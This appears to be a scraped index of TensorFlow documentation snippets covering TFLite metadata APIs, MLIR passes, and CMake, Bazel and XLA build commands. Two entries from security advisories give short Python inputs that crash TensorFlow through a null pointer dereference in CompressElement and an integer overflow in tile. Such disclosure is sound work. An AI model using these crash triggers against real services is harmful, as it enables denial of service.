SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/RegexTokenizerOptions.md#_snippet_6

LANGUAGE: python
CODE:
```
VocabFileIsNone()
```

----------------------------------------

TITLE: Finishing RegexTokenizerOptions definition in TFLite Metadata Python
DESCRIPTION: This Python function is part of the TFLite metadata schema generation utilities. It is used to finalize the definition of a `RegexTokenizerOptions` object within a Flatbuffers builder. It takes the `builder` object as input to complete the flatbuffer construction for this specific table.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/RegexTokenizerOptionsEnd.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.RegexTokenizerOptionsEnd(
    builder
)
```

----------------------------------------

TITLE: Download OVIC Test Data Archive - Shell
DESCRIPTION: Downloads the OVIC test data package archive using `curl` from a Google Cloud Storage URL and saves it to the temporary directory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/java/ovic/README.md#_snippet_0

LANGUAGE: sh
CODE:
```
curl -L https://storage.googleapis.com/download.tensorflow.org/data/ovic_2019_04_30.zip -o /tmp/ovic.zip
```

----------------------------------------

TITLE: Triggering TensorFlow CompressElement Null Dereference (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger a null pointer dereference vulnerability in TensorFlow's `tf.raw_ops.CompressElement` operation by providing an invalid input. The specific input `components=[[]]` exposes a flaw in the underlying C++ implementation related to buffer size checking. Requires TensorFlow library installed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-111.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf

tf.raw_ops.CompressElement(components=[[]])
```

----------------------------------------

TITLE: Lowering SpaceToDepth Operation to TOSA (MLIR)
DESCRIPTION: This function lowers a space-to-depth operation for the 'NHWC' data format to the TOSA dialect. It involves reshaping the input tensor to interleave spatial and block dimensions and then transposing the tensor to move the block dimensions to the channel dimension. Finally, it reshapes the result to combine the block dimensions with the original channel dimension.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_23

LANGUAGE: MLIR/TOSA
CODE:
```
Value lower_space_to_depth_op(Value %input, size_t block_size[], Format_t data_format)
{
    assert(data_format == 'NHWC')

    vector <size_t> a2_shape = {%input.shape[0],
                                %input.shape[1] / block_size[0],
                                %block_size[0],
                                %input_shape[2] / block_size[1],
                                %block_size[1],
                                %input_shape[3]}
    %a2_reshape = tosa.RESHAPE(%input) {new_shape=a2_shape}
    %a3_transpose = tosa.TRANSPOSE(%a2_reshape) {perm={0, 1, 3, 2, 4, 5}}

    vector <size_t> a4_shape = {%input.shape[0],
                                %input_shape[1] / block_size[0],
                                %input_shape[2] / block_size[1],
                                %input_shape[3] * block_size[0] * block_size[1]}
    %output = tosa.RESHAPE(%a3_transpose) {new_shape=%a4_shape}
    return %output
}
```

----------------------------------------

TITLE: Value Representation for OpResolverType.BUILTIN in Python
DESCRIPTION: This snippet shows the internal representation of the `BUILTIN` value for `OpResolverType`. `BUILTIN` represents the op resolver that uses optimized kernel implementations for built-in TensorFlow Lite operations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/experimental/OpResolverType.md#_snippet_1

LANGUAGE: Python
CODE:
```
<OpResolverType.BUILTIN: 1>
```

----------------------------------------

TITLE: Generate MLIR HLO Dialect Python Bindings
DESCRIPTION: This command generates Python bindings for the MHLO dialect using its TableGen (.td) file and Python source. It adds the generated sources to the `MLIRHLOPythonSources.Dialects` group and specifies the root directory, TableGen file, primary Python file, and dialect name.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/bindings/python/CMakeLists.txt#_snippet_4

LANGUAGE: CMake
CODE:
```
declare_mlir_dialect_python_bindings(
  ADD_TO_PARENT MLIRHLOPythonSources.Dialects
  ROOT_DIR "${CMAKE_CURRENT_SOURCE_DIR}/mlir"
  TD_FILE dialects/MhloOps.td
  SOURCES dialects/mhlo.py
  DIALECT_NAME mhlo)
```

----------------------------------------

TITLE: Upgrading All Python Dependencies Bazel Shell
DESCRIPTION: Executes the dependency updater command, passing the `--upgrade` flag to the underlying `pip-compile` tool. This tells the updater to attempt to upgrade all packages listed in the existing lock file to their latest compatible versions, not just update newly added dependencies.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/ci/official/requirements_updater/README.md#_snippet_3

LANGUAGE: Shell
CODE:
```
bazel run //ci/official/requirements_updater:requirements.update --repo_env=HERMETIC_PYTHON_VERSION=3.12 -- --upgrade
```

----------------------------------------

TITLE: Setting TensorFlow Lite Source Directory - CMake
DESCRIPTION: Sets the `TFLITE_SOURCE_DIR` variable based on the previously determined `TF_SOURCE_DIR`. This variable points to the root directory of the TensorFlow Lite source code.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/c/CMakeLists.txt#_snippet_3

LANGUAGE: CMake
CODE:
```
set(TFLITE_SOURCE_DIR "${TF_SOURCE_DIR}/tensorflow/lite")
```

----------------------------------------

TITLE: Dynamic TPU Layout Program MLIR
DESCRIPTION: Example showing the transformation by the `-tf-tpu-dynamic-layout-pass` in MLIR. The pass inserts `tf.TPUGetLayoutOp` and `tf.TPUCopyWithLayout` to allow the compiled layout to be determined at runtime and applied during the copy to the TPU device.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_54

LANGUAGE: mlir
CODE:
```
  %input = "tf.IteratorGetNext"(...) {device = "/CPU:0"}
  %compile:2 = "tf._TPUCompileMlir"(...)
  %get_layout = "tf.TPUGetLayoutOp"(%compile#1) {...}
  %copy_to_device = "tf.TPUCopyWithLayout"(%input, %get_layout)
      {device = "/TPU:0"}
  %execute = "tf.TPUExecute"(%copy_to_device, ..., %compile#1)
      {device = "/TPU:0"}
```

----------------------------------------

TITLE: Converting Control to Data Outputs in TF Executor While Loop (After)
DESCRIPTION: This MLIR snippet shows the `while_body` function after applying the `-tf-executor-convert-control-to-data-outputs` pass. The control dependencies from the assign operations (`%assign_0_control`, `%assign_1_control`) have been converted into data dependencies using `tf.Identity` ops that carry 'chain' tensors (`%chain_0`, `%chain_1`). This transformation removes the control barrier (`%barrier`) and allows for potential inter-iteration parallelism.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_10

LANGUAGE: MLIR
CODE:
```
func @while_body(%arg0: !tf_res, %arg1: !tf_res, %arg2: tensor<f32>, %arg3: tensor<f32>, %chain_0: tensor<i32>, %chain_1: tensor<i32>) -> (!tf_res, !tf_res, tensor<f32>, tensor<f32>, tensor<i32>, tensor<i32>) {
  %graph:6 = tf_executor.graph {
    %_, %chain_0_src = tf_executor.island wraps "tf.Identity"(%chain_0) : (tensor<i32>) -> tensor<i32>
    %_, %chain_1_src = tf_executor.island wraps "tf.Identity"(%chain_1) : (tensor<i32>) -> tensor<i32>
    %assign_0_control = tf_executor.island(%chain_0_src) wraps "tf.AssignVariableOp"(%arg0, %arg2) : (!tf_res, tensor<f32>) -> ()
    %assign_1_control = tf_executor.island(%chain_1_src) wraps "tf.AssignVariableOp"(%arg1, %arg3) : (!tf_res, tensor<f32>) -> ()
    %add_out, %add_control = tf_executor.island wraps "tf.Add"(%arg2, %arg3) : (tensor<f32>, tensor<f32>) -> tensor<f32>
    %mul_out, %mul_control = tf_executor.island wraps "tf.Mul"(%arg2, %arg3) : (tensor<f32>, tensor<f32>) -> tensor<f32>
    %chain_0_sink, %_ = tf_executor.island(%assign_0_control) wraps "tf.Identity"(%chain_0) : (tensor<i32>) -> tensor<i32>
    %chain_1_sink, %_ = tf_executor.island(%assign_1_control) wraps "tf.Identity"(%chain_1) : (tensor<i32>) -> tensor<i32>
    tf_executor.fetch %arg0, %arg1, %add_out, %mul_out, %chain_0_sink, %chain_1_sink : !tf_res, !tf_res, tensor<f32>, tensor<f32>, tensor<i32>, tensor<i32>
  }
  return %graph#0, %graph#1, %graph#2, %graph#3, %graph#4, %graph#5 : !tf_res, !tf_res, tensor<f32>, tensor<f32>, tensor<i32>, tensor<i32>
}
```

----------------------------------------

TITLE: MLIR Device Cluster before Outside Compilation Extraction Pass
DESCRIPTION: This MLIR snippet shows a `tf_device.cluster` containing operations, including one (`tf.Identity`) marked with `_xla_outside_compilation`. This represents the state before the pass extracts such operations into separate `tf_device.parallel_execute` regions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_27

LANGUAGE: mlir
CODE:
```
func @outside_compilation() -> tensor<f32> {
  %0 = "tf_device.cluster"() ( {
    %1 = "tf.Const"() {_xla_outside_compilation = "0", value = dense<1.0> : tensor<f32>} : () -> (tensor<f32>)
    %2 = "tf.Identity"(%1) {_xla_outside_compilation = "0"} : (tensor<f32>) -> (tensor<f32>)
    %3 = "tf.AddV2"(%1, %2) : (tensor<f32>, tensor<f32>) -> (tensor<f32>)
    tf_device.return %3 : tensor<f32>
  }) {num_cores_per_replica = 1, topology =  "", device_assignment =  []} : () -> tensor<f32>
  return %0 : tensor<f32>
}
```

----------------------------------------

TITLE: Importing Libraries Python
DESCRIPTION: Imports the essential TensorFlow and TensorFlow Datasets libraries. These modules provide the core functionalities for building neural networks, loading datasets, and utilizing TensorFlow features like XLA.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tf2xla/tutorials/autoclustering_xla.ipynb#_snippet_1

LANGUAGE: python
CODE:
```
import tensorflow as tf
import tensorflow_datasets as tfds
```

----------------------------------------

TITLE: Check Associated Files Null - TensorMetadata (Python)
DESCRIPTION: Determines if the associated files list for the tensor metadata is null or empty. Returns True if there are no associated files, False otherwise.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorMetadata.md#_snippet_1

LANGUAGE: python
CODE:
```
AssociatedFilesIsNone()
```

----------------------------------------

TITLE: Getting TensorGroup Name | TensorFlow Lite Support Python
DESCRIPTION: Retrieves the name associated with the tensor group. This method returns the name as a string.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorGroup.md#_snippet_3

LANGUAGE: python
CODE:
```
Name()
```

----------------------------------------

TITLE: Getting Vocabulary File Data Length in Python
DESCRIPTION: Returns the length of the vocabulary file data stored in the `RegexTokenizerOptions` object. This might represent the number of entries or bytes depending on the schema.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/RegexTokenizerOptions.md#_snippet_7

LANGUAGE: python
CODE:
```
VocabFileLength()
```

----------------------------------------

TITLE: Initializing TensorMetadataT object Python
DESCRIPTION: This is the constructor signature for the `TensorMetadataT` class in the TensorFlow Lite Support metadata schema. It initializes a new instance of the `TensorMetadataT` object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorMetadataT.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_schema_py_generated.TensorMetadataT()
```

----------------------------------------

TITLE: Value Representation for OpResolverType.BUILTIN_REF in Python
DESCRIPTION: This snippet shows the internal representation of the `BUILTIN_REF` value for `OpResolverType`. `BUILTIN_REF` indicates the op resolver that uses reference kernel implementations, primarily intended for testing and debugging purposes rather than production use.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/experimental/OpResolverType.md#_snippet_2

LANGUAGE: Python
CODE:
```
<OpResolverType.BUILTIN_REF: 2>
```

----------------------------------------

TITLE: Apply Compile Options (CMake)
DESCRIPTION: Applies specific compile options to the 'tf_xla_runtime_objects' target. The 'PRIVATE' keyword limits these options to the compilation of this target's sources. It includes various compiler flags, primarily warnings suppression.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/pip_package/xla_build/CMakeLists.txt#_snippet_4

LANGUAGE: CMake
CODE:
```
target_compile_options(tf_xla_runtime_objects PRIVATE
  -ftemplate-backtrace-limit=0
  -Wno-ignored-attributes
  -Wno-deprecated-copy
  -Wno-cast-qual
  -Wno-sign-compare
)
```

----------------------------------------

TITLE: Get Root BertTokenizerOptions Object from Buffer Python (Deprecated)
DESCRIPTION: Retrieves the root `BertTokenizerOptions` object from a FlatBuffer buffer. This method is deprecated; use `GetRootAs` instead for future compatibility.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/BertTokenizerOptions.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
GetRootAsBertTokenizerOptions(
    buf, offset=0
)
```

----------------------------------------

TITLE: Example MLIR after Control Dependency Update Pass
DESCRIPTION: This MLIR snippet shows the same example function after the control dependency update pass. Explicit control dependencies (e.g., `tf_executor.island(%read0_control)`) have been added between islands to preserve semantic ordering based on side effect analysis.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_24

LANGUAGE: mlir
CODE:
```
    func.func @example(%arg0: tensor<*x!tf_type.resource<tensor<32xf32>>>, %arg1: tensor<32xf32>) -> tensor<32xf32> {
      %0 = tf_executor.graph {
        %read0, %read0_control = tf_executor.island wraps "tf.ReadVariableOp"(%arg0) : (tensor<*x!tf_type.resource<tensor<32xf32>>>) -> tensor<32xf32>
        %assign0_control = tf_executor.island(%read0_control) wraps "tf.AssignVariableOp"(%arg0, %arg1) : (tensor<*x!tf_type.resource<tensor<32xf32>>>, tensor<32xf32>) -> ()
        %read1, %read1_control = tf_executor.island(%assign0_control) wraps "tf.ReadVariableOp"(%arg0) : (tensor<*x!tf_type.resource<tensor<32xf32>>>) -> tensor<32xf32>
        %print, %print_control = tf_executor.island(%read1_control) wraps "tf.Print"(%read1) {message = "read1 value"} : (tensor<32xf32>) -> tensor<32xf32>
        tf_executor.fetch %read1, %print_control : tensor<32xf32>, !tf_executor.control
      }
      return %0 : tensor<32xf32>
    }
```

----------------------------------------

TITLE: Copy XLA to TensorFlow Third Party (Shell)
DESCRIPTION: Copies the contents of the `openxla/xla` directory and its third-party subdirectories into the `tensorflow/tensorflow/third_party` location. This makes the XLA source code available within the TensorFlow repository structure for compilation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/build_tools/ci/golden_commands.txt#_snippet_7

LANGUAGE: shell
CODE:
```
cp -r $GITHUB_WORKSPACE/openxla/xla $GITHUB_WORKSPACE/tensorflow/tensorflow/third_party
```

LANGUAGE: shell
CODE:
```
find $GITHUB_WORKSPACE/openxla/xla/third_party/ -maxdepth 1 -exec cp -r {} $GITHUB_WORKSPACE/tensorflow/tensorflow/third_party ;
```

----------------------------------------

TITLE: Configuring C++ Test with Bazel - Bazel
DESCRIPTION: Illustrates the Bazel `cc_test` rule used to configure tests for a StableHLO operation. Tests are written using GoogleTest and should fully verify correctness and robustness.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/experimental/shlo/README.md#_snippet_5

LANGUAGE: Bazel
CODE:
```
cc_test(
  name = "op_name_test",
  srcs = [ "op_name_test.cc" ],
  hdrs = [ "op_name_test.h" ], # Generally not needed.
  deps = [
    # ...
  ]
)
```

----------------------------------------

TITLE: Run Multiple hlo-opt Passes
DESCRIPTION: This command applies a sequence of multiple HLO passes (`pass1`, `pass2`, `pass3`) to an input HLO module using `hlo-opt`. Passes are listed comma-separated.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tools.md#_snippet_17

LANGUAGE: Command Line
CODE:
```
hlo-opt --passes=pass1,pass2,pass3 input.hlo
```

----------------------------------------

TITLE: Perform Deviceless Compilation with Autotune Results
DESCRIPTION: This command performs deviceless compilation using `hlo-opt` for CUDA, loading pre-existing autotuning results from a file using `--xla_gpu_load_autotune_results_from`. This avoids needing autotuning or a device during compilation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tools.md#_snippet_10

LANGUAGE: Command Line
CODE:
```
hlo-opt  --platform=CUDA --stage=llvm  --xla_gpu_target_config_filename=gpu_specs/a100_pcie_80.txtpb --xla_gpu_load_autotune_results_from=results.textpb input.hlo
```

----------------------------------------

TITLE: Performing Bazel Build Dry Run (Bazel)
DESCRIPTION: Used in the CI process, this Bazel command performs a dry run of the build for the specified `test_targets`. The `--nobuild` flag prevents actual compilation, allowing the command to quickly check for configuration errors and dependencies.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/build_tools/ci/readme.md#_snippet_1

LANGUAGE: Bazel
CODE:
```
bazel build --nobuild ... test_targets
```

----------------------------------------

TITLE: Defining an HLO Iota Operation (HLO Pseudo-code)
DESCRIPTION: This snippet shows the HLO definition for an `iota` operation. It creates a tensor `iota` of shape `f32[2, 4]` where the values increment along dimension 1, starting from 0.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/indexing.md#_snippet_4

LANGUAGE: HLO Pseudo-code
CODE:
```
iota = f32[2,4] iota(), dimensions={1}
```

----------------------------------------

TITLE: Defining Custom CUDNN Distributions Dictionary (Bazel)
DESCRIPTION: This Bazel dictionary (`_CUSTOM_CUDNN_REDISTRIBUTIONS`) specifies the locations for custom CUDNN distributions directly within the WORKSPACE file. It follows the same structure as the custom CUDNN JSON format, mapping components, platforms, and CUDA versions to paths using `relative_path` or `full_path`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/hermetic_cuda.md#_snippet_12

LANGUAGE: Bazel
CODE:
```
_CUSTOM_CUDNN_REDISTRIBUTIONS = {
   "cudnn": {
      "linux-x86_64": {
         "cuda12": {
         "relative_path": "cudnn/linux-x86_64/cudnn-linux-x86_64-9.0.0.312_cuda12-archive.tar.xz",
         }
      },
      "linux-sbsa": {
         "cuda12": {
         "relative_path": "cudnn/linux-sbsa/cudnn-linux-sbsa-9.0.0.312_cuda12-archive.tar.xz",
         }
      }
   }
}
```

----------------------------------------

TITLE: Basic Conditional Assignment - Python
DESCRIPTION: A simple Python `if` statement that negates a variable `a` if it is less than zero. This is presented as a basic Python control flow example before showing its AutoGraph conversion.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/control_flow.md#_snippet_4

LANGUAGE: Python
CODE:
```
if a < 0:
  a = -a
```

----------------------------------------

TITLE: Configuring XLA for CPU Backend Inside Docker (Linux)
DESCRIPTION: Executes the XLA configuration script `./configure.py` inside the specified Docker container, setting the build target backend to CPU. This prepares the build environment within the isolated Docker container.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/build_from_source.md#_snippet_1

LANGUAGE: shell
CODE:
```
docker exec xla ./configure.py --backend=CPU
```

----------------------------------------

TITLE: Defining Internal Function (__inference_callee_10) - TensorFlow GraphDef
DESCRIPTION: This entry defines an internal function used within the graph. It takes a float tensor 'x' and a resource handle 'readvariableop_resource' as inputs. The function reads the variable via the handle and outputs both the original input 'x' and the read variable value.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tf2xla/api/v2/testdata/graph_with_flib_def.txt#_snippet_7

LANGUAGE: TensorFlow GraphDef
CODE:
```
library {
  function {
    signature {
      name: "__inference_callee_10"
      input_arg {
        name: "x"
        type: DT_FLOAT
      }
      input_arg {
        name: "readvariableop_resource"
        type: DT_RESOURCE
        handle_data {
          dtype: DT_FLOAT
          shape {
          }
        }
      }
      output_arg {
        name: "identity"
        type: DT_FLOAT
      }
      output_arg {
        name: "identity_1"
        type: DT_FLOAT
      }
      is_stateful: true
      control_output: "ReadVariableOp"
    }
    node_def {
      name: "ReadVariableOp"
      op: "ReadVariableOp"
      input: "readvariableop_resource"
      attr {
        key: "_output_shapes"
        value {
          list {
            shape {
            }
          }
        }
      }
      attr {
        key: "dtype"
        value {
          type: DT_FLOAT
        }
      }
    }
    node_def {
      name: "Identity"
      op: "Identity"
      input: "x"
      input: "^NoOp"
      attr {
        key: "T"
        value {
          type: DT_FLOAT
        }
      }
      attr {
        key: "_output_shapes"
        value {
          list {
            shape {
            }
          }
        }
      }
    }
    node_def {
      name: "Identity_1"
      op: "Identity"
      input: "ReadVariableOp:value:0"
      input: "^NoOp"
      attr {
        key: "T"
        value {
          type: DT_FLOAT
        }
      }
      attr {
        key: "_output_shapes"
        value {
          list {
            shape {
            }
          }
        }
      }
    }
    node_def {
      name: "NoOp"
      op: "NoOp"
      input: "^ReadVariableOp"
      attr {
        key: "_output_shapes"
        value {
          list {
          }
        }
      }
    }
    ret {
      key: "identity"
      value: "Identity:output:0"
    }
    ret {
      key: "identity_1"
      value: "Identity_1:output:0"
    }
    attr {
      key: "_construction_context"
      value {
        s: "kEagerRuntime"
      }
    }
    attr {
      key: "_input_shapes"
      value {
        list {
          shape {
          }
          shape {
          }
        }
      }
    }
    control_ret {
      key: "ReadVariableOp"
      value: "ReadVariableOp"
    }
    arg_attr {
      key: 0
      value {
        attr {
          key: "_output_shapes"
          value {
            list {
              shape {
              }
            }
          }
        }
        attr {
          key: "_user_specified_name"
          value {
            s: "x"
          }
        }
      }
    }
    arg_attr {
      key: 1
      value {
        attr {
          key: "_user_specified_name"
          value {
            s: "resource"
          }
        }
      }
    }
  }
}
```

----------------------------------------

TITLE: Handling Composite Functions in TensorFlow Lite MLIR C++ Converter
DESCRIPTION: Illustrates the workflow within the TensorFlow Lite MLIR converter pass (`PrepareCompositeFunctionsPass`) that handles functions marked with the `tf._implements` attribute. It checks the value of the attribute to identify the composite operation (like "embedding_lookup" or "keras_lstm") and calls the corresponding conversion logic to replace the function body with the fused MLIR operation representation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/operation_fusion.md#_snippet_3

LANGUAGE: c++
CODE:
```
void PrepareCompositeFunctionsPass::ConvertTFImplements(FuncOp func,
                                                        StringAttr attr) {
  if (attr.getValue() == "embedding_lookup") {
    func.eraseBody();
    func.addEntryBlock();
    // Convert the composite embedding_lookup function body to a
    // TFLite fused embedding_lookup op.
    ConvertEmbeddedLookupFunc convert_embedded_lookup(func);
    if (failed(convert_embedded_lookup.VerifySignature())) {
      return signalPassFailure();
    }
    convert_embedded_lookup.RewriteFunc();
  } else if (attr.getValue() == mlir::TFL::kKerasLstm) {
     func.eraseBody();
     func.addEntryBlock();
     OpBuilder builder(func.getBody());
     if (failed(ConvertKerasLSTMLayer(func, &builder))) {
       return signalPassFailure();
     }
  } else if (.....) /* Other fusions can plug in here */
}
```

----------------------------------------

TITLE: Installing TF Lite Android Demo APK
DESCRIPTION: This shell command uses the Android Debug Bridge (ADB) to install the compiled APK file generated by the Bazel build process onto a connected, debug-enabled Android device. ADB must be installed and the device connected and authorized.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/java/demo/README.md#_snippet_1

LANGUAGE: Shell
CODE:
```
adb install bazel-bin/tensorflow/lite/java/demo/app/src/main:TfLiteCameraDemo.apk
```

----------------------------------------

TITLE: Configuring C++ Benchmark with Bazel - Bazel
DESCRIPTION: Shows the Bazel `cc_test` rule (often used for benchmarks with Google Benchmark) to configure performance tests for an operation. The name includes the `_bench` suffix.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/experimental/shlo/README.md#_snippet_6

LANGUAGE: Bazel
CODE:
```
cc_test(
  name = "op_name_bench",
  srcs = [ "op_name_bench.cc" ],
  hdrs = [ "op_name_bench.h" ], # Generally not needed.
  deps = [
    # ...
  ]
)
```

----------------------------------------

TITLE: Initialize BertTokenizerOptions Object Python
DESCRIPTION: Initializes the `BertTokenizerOptions` object with the provided buffer and position. This method is typically called internally after getting the root object from a buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/BertTokenizerOptions.md#_snippet_3

LANGUAGE: python
CODE:
```
Init(
    buf, pos
)
```

----------------------------------------

TITLE: Demonstrating tf.tile Overflow Vulnerability in Python
DESCRIPTION: This Python snippet demonstrates the TensorFlow `tf.tile` vulnerability (TFSA-2021-196). It calls `tf.keras.backend.tile` with a small input tensor (`np.ones`) and very large tiling dimensions (`n`), which causes an integer overflow when calculating the output size, leading to a crash. Requires TensorFlow and NumPy.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-196.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
import numpy as np
tf.keras.backend.tile(x=np.ones((1,1,1)), n=[100000000,100000000, 100000000])
```

----------------------------------------

TITLE: Checking ProcessUnit Buffer Identifier Python
DESCRIPTION: A class method that checks if a FlatBuffers buffer contains the identifier for a `ProcessUnit` table. This helps verify if the buffer's content corresponds to a `ProcessUnit` object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ProcessUnit.md#_snippet_5

LANGUAGE: python
CODE:
```
@classmethod
ProcessUnitBufferHasIdentifier(
    buf, offset, size_prefixed=False
)
```

----------------------------------------

TITLE: Add height field to ImageSize FlatBuffer object (Python)
DESCRIPTION: This function adds the 'height' field to an 'ImageSize' table being constructed using a FlatBuffer builder. It requires the active builder instance and the integer value for the height. It is part of the FlatBuffer construction sequence for the metadata schema.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ImageSizeAddHeight.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.ImageSizeAddHeight(
    builder, height
)
```

----------------------------------------

TITLE: Initialize Content Object Python
DESCRIPTION: Initializes the Content object with a buffer and a position. This method is typically called internally or after getting a reference within a buffer to set up the object's internal state.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/Content.md#_snippet_5

LANGUAGE: python
CODE:
```
Init(
    buf, pos
)
```

----------------------------------------

TITLE: Create Bash Script for Multi-Process HLO Runner Bash
DESCRIPTION: This defines the content of a bash script (`run.sh`) intended for multi-process execution using MPI. It sets `CUDA_VISIBLE_DEVICES` based on the local MPI rank and passes MPI-provided variables (`OMPI_COMM_WORLD_RANK`, `OMPI_COMM_WORLD_SIZE`) and a fixed address to the `bazel run` command executing the HLO runner with a specified HLO file.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tools_multihost_hlo_runner.md#_snippet_9

LANGUAGE: bash
CODE:
```
#!/bin/bash
export CUDA_VISIBLE_DEVICES=${OMPI_COMM_WORLD_LOCAL_RANK}
bazel run //xla/tools/multihost_hlo_runner:hlo_runner_main -- \
  --task_id=${OMPI_COMM_WORLD_RANK} \
  --num_nodes=${OMPI_COMM_WORLD_SIZE} \
  --address=127.0.0.1:12345 \
  /tmp/dump_multi_process/module_0023.pjit__wrapped_step_fn.before_optimizations.txt
```

----------------------------------------

TITLE: Calling TensorMetadataEnd function in Python
DESCRIPTION: This snippet shows the basic signature for calling the `TensorMetadataEnd` function. It requires a `builder` object as an argument, which is typically used in a sequence of calls to construct flatbuffer metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorMetadataEnd.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.TensorMetadataEnd(
    builder
)
```

----------------------------------------

TITLE: Accessing Input Tensor Metadata in Python
DESCRIPTION: Accesses a specific entry in the list of input tensor metadata. This method allows retrieval of metadata for a particular input tensor by its index.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadata.md#_snippet_16

LANGUAGE: python
CODE:
```
InputTensorMetadata(
    j
)
```

----------------------------------------

TITLE: Good Practice: Single-Line Lambda Assignment (Pre-TF 2.3) Python
DESCRIPTION: Shows the recommended practice for declaring lambda functions in older TensorFlow versions (pre-TF 2.3) to ensure AutoGraph can parse them correctly. Declaring the lambda on a single line as a direct assignment helps `inspect.getsource` capture the full, valid source code.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_55

LANGUAGE: Python
CODE:
```
# Good - single assignment
my_lambda = lambda: x
```

----------------------------------------

TITLE: Create Bazel Output Directory (ARM64) - Shell
DESCRIPTION: Creates the directory specified by `--test_tmpdir` for Bazel to store build and test output files. The `-p` flag ensures parent directories are created as needed and suppresses errors if the directory already exists.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/build_tools/ci/golden_commands.txt#_snippet_18

LANGUAGE: Shell
CODE:
```
mkdir -p /tmpfs/bazel_output
```

----------------------------------------

TITLE: Lowering Expand Dims (MLIR/TOSA IR)
DESCRIPTION: Lowers an ExpandDims operation to TOSA. It calculates the desired output shape with an additional dimension of size 1 inserted at the specified axis. The operation is implemented using a single `tosa.RESHAPE` operation to transform the input tensor into the calculated output shape.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_8

LANGUAGE: MLIR/TOSA IR
CODE:
```
Value lower_expand_dims(Value %input, int32 axis)
{
    vector<size_t> reshape_dims

